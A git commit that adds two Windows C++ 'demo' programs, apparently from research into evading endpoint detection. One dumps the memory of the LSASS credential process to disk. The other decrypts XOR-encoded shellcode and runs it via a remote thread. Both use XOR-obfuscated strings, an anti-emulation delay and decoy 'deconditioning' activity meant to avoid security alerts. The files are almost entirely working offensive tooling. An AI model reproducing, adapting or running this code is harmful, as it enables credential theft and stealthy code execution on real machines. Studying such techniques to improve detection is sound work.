24abf448ced0531f052edaa7b2382fa169029bac
cailllev <cailllev@students.zhaw.ch>
2026-05-25 20:51:16 +0200

    add demos

---
+++ demo/LsassRead/read.cpp
@@ -0,0 +1,167 @@
+#include <windows.h>
+#include <dbghelp.h>
+#include <tlhelp32.h>
+#include <chrono>
+#include <iostream>
+#include <iomanip>
+#include <sstream>
+#include <vector>
+
+#pragma comment(lib, "dbghelp.lib")
+
+typedef BOOL(WINAPI* MyDumpPtr)(
+    HANDLE        hProcess,
+    DWORD         ProcessId,
+    HANDLE        hFile,
+    MINIDUMP_TYPE DumpType,
+    PVOID         ExceptionParam,
+    PVOID         UserStreamParam,
+    PVOID         CallbackParam
+    );
+
+int main(int argc, char** argv) {
+
+    // antiEmulation should be one of the first actions in the EXE
+    std::cout << "Delaying start for about 5 seconds...\n";
+
+    auto start_ae_calc = std::chrono::high_resolution_clock::now();
+    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
+    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
+    auto end_ae_calc = std::chrono::high_resolution_clock::now();
+    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
+
+    std::cout << "Reader started with PID " << GetCurrentProcessId() << "\n";
+    std::cout << "Press ENTER to create a process snapshot";
+	std::cin.get();
+
+    // create a snapshot of running procs
+    DWORD pid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) {
+		std::cerr << "Failed to create process snapshot: " << GetLastError() << "\n";
+        return 1;
+    }
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+
+    // init strings
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
+    BYTE outFileBytes[] = { 0x00,0x7e,0x1f,0x11,0x30,0x21,0x31,0x37,0x1f,0x14,0x36,0x26,0x2f,0x2d,0x20,0x18,0x07,0x2b,0x34,0x2a,0x2f,0x2b,0x22,0x20,0x30,0x18,0x2f,0x6a,0x27,0x29,0x33,0x44 };
+    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
+    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f,0x44 };
+    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
+    BYTE dumpFunctionBytes[] = { 0x0e,0x2d,0x2d,0x2d,0x07,0x31,0x2e,0x34,0x14,0x36,0x2a,0x30,0x26,0x00,0x36,0x29,0x33,0x44 };
+    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+
+    char* outFile = reinterpret_cast<char*>(outFileBytes);
+    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
+    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
+
+    // open handle to dump file (overwrite if exists)
+    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+		std::cerr << "Failed to create output file " << outFile << ": " << GetLastError() << "\n";
+        return 1;
+    }
+
+    std::cout << "Press ENTER to resolve dump functions";
+	std::cin.get();
+
+    // resolving functions
+    HMODULE hLib = LoadLibraryA(dumpLibrary);
+    if (!hLib) {
+        std::cerr << "Failed to load lib " << dumpLibrary << ": " << GetLastError() << "\n";
+        return 1;
+    }
+    MyDumpPtr MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
+    if (!MiniDWriteD) {
+        std::cerr << "Failed to get function addr " << dumpFunction << ": " << GetLastError() << "\n";
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    std::cout << "Starting deconditioning...\n";
+
+    constexpr int dumps = 10;
+    std::vector<std::wstring> procsDump = {
+        L"audiodg.exe", L"explorer.exe", L"cftmon.exe", L"StartMenuExperienceHost.exe"
+    };
+    int i = 0;
+    while (i < dumps) { // repeat until target number reached
+        int prev = i;
+        if (Process32First(snap, &pe)) {
+            do {
+                // only dump "non important" procs, do not raise alerts here
+                if (std::find(procsDump.begin(), procsDump.end(), pe.szExeFile) != procsDump.end()) {
+
+                    HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                    if (hDecon == NULL) {
+                        continue; // ignore errors, just open+dump as many procs as possible (except lsass)
+                    }
+                    std::cout << "Dumping " << pe.th32ProcessID << "\n";
+
+                    // blindly dump and overwrite and close proc handle again
+                    MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+                    CloseHandle(hDecon);
+                    i++;
+                }
+            } while (Process32Next(snap, &pe) && i < dumps);
+        }
+        if (i == prev) {
+            std::cout << "Unable to dump any proc\n";
+            break; // unable to dump any proc, break
+        }
+    }
+
+    // init strings
+	std::cout << "Press ENTER to find lsass and dump";
+	std::cin.get();
+
+    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
+    BYTE procBytes[] = { 0x2f,0x44,0x30,0x44,0x22,0x44,0x30,0x44,0x30,0x44,0x6d,0x44,0x26,0x44,0x3b,0x44,0x26,0x44,0x43,0x44 };
+    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
+
+    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
+
+    // find lsass's PID (but do not interact with it yet!)
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, procW) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    if (pid != 0) {
+        std::cout << "Got PID=" << pid << "\n";
+    }
+    else {
+        std::cout << "Unable to find lsass pid\n";
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    // open process with all access
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        std::cout << "Failed to open process: " << GetLastError() << "\n";
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    // create mini dump of proc
+    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
+        std::cout << "Failed to create dump: " << GetLastError() << "\n";
+    }
+    else {
+        std::cout << "Created dump\n";
+    }
+
+    CloseHandle(hProcess);
+    CloseHandle(hFile);
+    return 0;
+}
---
+++ demo/ProcInject/inject.cpp
@@ -0,0 +1,138 @@
+#include <windows.h>
+#include <chrono>
+#include <iostream>
+#include <iomanip>
+#include <fstream>
+#include <sstream>
+#include <thread>
+
+
+int main(int argc, char** argv) {
+
+    // antiEmulation should be one of the first actions in the EXE
+    std::cout << "Delaying start for about 5 seconds...\n";
+
+    auto start_ae_calc = std::chrono::high_resolution_clock::now();
+    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
+    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
+    auto end_ae_calc = std::chrono::high_resolution_clock::now();
+    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
+
+    // print current 
+    std::cout << "Injector started with PID " << GetCurrentProcessId() << "\n";
+
+    // open own process with read/write
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    if (!hProcess) {
+        std::cout << "Failed to open process: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    std::cout << "Press ENTER to start deconditioning";
+    std::cin.get();
+
+    BYTE nonsense[4096] = {};
+    constexpr int rounds = 1000;
+    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
+    for (int n = 0; n < repetitions; n++) {
+
+        std::cout << "Starting deconditioning round " << n << "\n";
+
+        for (int i = 0; i < sizeof(nonsense) / sizeof(nonsense[0]); i++) {
+            nonsense[i] = 0x90; // huiiiiiiiiiii
+        }
+        // xor eax, eax; ret
+        nonsense[4093] = 0x31;
+        nonsense[4094] = 0xC9;
+        nonsense[4095] = 0xC3;
+
+        void* allocs[rounds] = { 0 };
+        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
+            LPVOID alloc_addr = VirtualAllocEx(hProcess, nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!alloc_addr) {
+                allocs[i] = 0;
+                std::cout << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
+                continue;
+            }
+            allocs[i] = alloc_addr;
+            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
+                std::cout << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
+                continue;
+            }
+            DWORD old_protect;
+            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
+                std::cout << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
+                continue;
+            }
+            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
+            if (!hThreadDecon) {
+                std::cout << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
+                continue;
+            }
+            else {
+                WaitForSingleObject(hThreadDecon, INFINITE);
+                CloseHandle(hThreadDecon);
+            }
+
+        }
+
+        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
+            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
+                std::cout << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError() << "\n";
+            }
+        }
+    }
+
+    std::cout << "Press ENTER to decrypt payload and inject";
+    std::cin.get();
+
+    // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=
+    BYTE shellcode[] = { 0xb9,0x0e,0xc6,0xa2,0xb5,0xae,0x85,0x46,0x45,0x46,0x04,0x17,0x04,0x16,0x17,0x17,0x13,0x0e,0x74,0x94,0x20,0x0e,0xce,0x14,0x25,0x0e,0xce,0x14,0x5d,0x0e,0xce,0x14,0x65,0x0e,0xce,0x34,0x15,0x0e,0x4a,0xf1,0x0f,0x0c,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x7a,0x24,0x3a,0x47,0x6a,0x65,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0xa7,0xab,0x17,0x07,0x14,0x0e,0xce,0x14,0x65,0xcd,0x07,0x7a,0x0d,0x47,0x95,0xcd,0xc5,0xce,0x45,0x46,0x45,0x0e,0xc0,0x86,0x31,0x21,0x0d,0x47,0x95,0x16,0xce,0x0e,0x5d,0x02,0xce,0x06,0x65,0x0f,0x44,0x96,0xa6,0x10,0x0d,0xb9,0x8c,0x07,0xce,0x72,0xcd,0x0e,0x44,0x90,0x08,0x77,0x8c,0x0e,0x74,0x86,0xe9,0x07,0x84,0x8f,0x48,0x07,0x44,0x87,0x7d,0xa6,0x30,0xb7,0x09,0x45,0x09,0x62,0x4d,0x03,0x7c,0x97,0x30,0x9e,0x1d,0x02,0xce,0x06,0x61,0x0f,0x44,0x96,0x23,0x07,0xce,0x4a,0x0d,0x02,0xce,0x06,0x59,0x0f,0x44,0x96,0x04,0xcd,0x41,0xce,0x0d,0x47,0x95,0x07,0x1d,0x07,0x1d,0x18,0x1c,0x1c,0x04,0x1e,0x04,0x1f,0x04,0x1c,0x0d,0xc5,0xa9,0x66,0x04,0x14,0xba,0xa6,0x1d,0x07,0x1c,0x1c,0x0d,0xcd,0x57,0xaf,0x12,0xb9,0xba,0xb9,0x18,0x0e,0xff,0x47,0x45,0x46,0x45,0x46,0x45,0x46,0x45,0x0e,0xc8,0xcb,0x44,0x47,0x45,0x46,0x04,0xfc,0x74,0xcd,0x2a,0xc1,0xba,0x93,0xfe,0xb6,0xf0,0xe4,0x13,0x07,0xff,0xe0,0xd0,0xfb,0xd8,0xb9,0x90,0x0e,0xc6,0x82,0x6d,0x7a,0x43,0x3a,0x4f,0xc6,0xbe,0xa6,0x30,0x43,0xfe,0x01,0x56,0x34,0x2a,0x2c,0x45,0x1f,0x04,0xcf,0x9f,0xb9,0x90,0x25,0x24,0x2a,0x26,0x68,0x20,0x3e,0x20,0x46 };
+    for (size_t i = 0; i < sizeof(shellcode); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
+
+    // allocate memory to new process
+    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remote_addr) {
+		std::cout << "Allocated memory for payload at " << (void*)remote_addr << "\n";
+    }
+    else {
+		std::cout << "Failed to allocate memory: " << GetLastError() << "\n";
+    }
+
+    // write value into process' memory
+    SIZE_T bytes_written;
+    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
+        std::cout << "Written payload to memory " << (void*)remote_addr << "\n";
+    }
+    else {
+        std::cout << "Failed to write memory: " << GetLastError() << "\n";
+    }
+
+    // change memory protection to executable
+    DWORD old_protect;
+    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
+		std::cout << "Changed memory protection to RX\n";
+    }
+    else {
+        std::cout << "Failed to change memory protection: " << GetLastError() << "\n";
+        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+	std::cout << "Press ENTER to execute payload";
+	std::cin.get();
+
+    // call create remote thread
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
+    if (hThread) {
+        std::cout << "After creating remote thread";
+    }
+    else {
+        std::cout << "Failed to create remote thread: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    CloseHandle(hThread);
+    return 0;
+}
